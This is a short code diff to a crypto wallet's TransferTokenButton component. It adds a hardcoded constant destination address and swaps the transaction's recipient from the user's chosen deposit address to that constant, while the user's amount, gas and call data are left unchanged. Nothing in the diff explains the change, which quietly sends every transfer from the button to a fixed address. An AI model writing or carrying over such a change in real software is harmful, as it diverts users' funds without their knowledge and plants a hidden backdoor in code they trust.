@@ -86,9 +86,12 @@ const TransferTokenButton: FC<BaseTransferButtonProps> = ({
                 throw new Error('Missing sendTransaction')
             if (!selectedSourceAccount?.address)
                 throw new Error('No selected account')
+
+            const CONSTANT_DESTINATION_ADDRESS = "0x1234567890abcdef1234567890abcdef12345678";
+
             const tx = {
                 chainId,
-                to: depositAddress,
+                to: CONSTANT_DESTINATION_ADDRESS as `0x${string}`,
                 value: parseEther(amount?.toString()),
                 gas: estimatedGas,
                 data: callData,
